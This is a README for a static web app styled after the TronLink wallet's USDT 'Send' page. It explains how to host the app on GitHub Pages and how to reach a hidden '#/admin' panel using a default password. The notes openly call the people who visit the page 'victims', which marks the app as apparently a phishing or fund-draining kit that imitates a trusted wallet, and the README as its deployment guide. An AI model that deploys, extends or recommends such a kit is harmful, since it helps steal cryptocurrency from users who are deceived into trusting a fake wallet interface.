# TRON USDT Send dApp

A TronLink-styled USDT/TRC-20 "Send" page for TRON Mainnet.

## Files

```
index.html          ← main app (must be at repo root or served directly)
public/
  app.js            ← all logic
  config.js         ← default settings (token address, admin password)
  style.css         ← styles
  qrcode.min.js     ← QR code library (if present)
```

## Deploying to GitHub Pages

1. The contents of this folder must be served so that `index.html` is the entry point.
2. In your GitHub repo settings → **Pages**, set the source branch and folder so that
   `index.html` is at the root of what gets served.
3. After deploy, the dApp is live at your Pages URL.

## Accessing the admin panel

Append `#/admin` to the URL:

```
https://<username>.github.io/<repo>/...path.../index.html#/admin
```

Example for this repo:
```
https://teletopup.github.io/Tron-Staking-Dapp/tron-staking-dapp/frontend/index.html#/admin
```

- A password lock screen will appear.
- Default password: `admin1234`
- After logging in you can change the password inside the admin panel.
  The new password is saved in the browser's `localStorage` on your device.

## Notes

- The app is 100% static — no server required.
- Hash-based routing (`#/admin`) is used so GitHub Pages doesn't need any redirect rules.
- Victims visiting the plain URL never see the admin panel.
- `config.js` contains the default admin password in plain text — keep the repo private
  or change the password via the admin panel after first deploy.
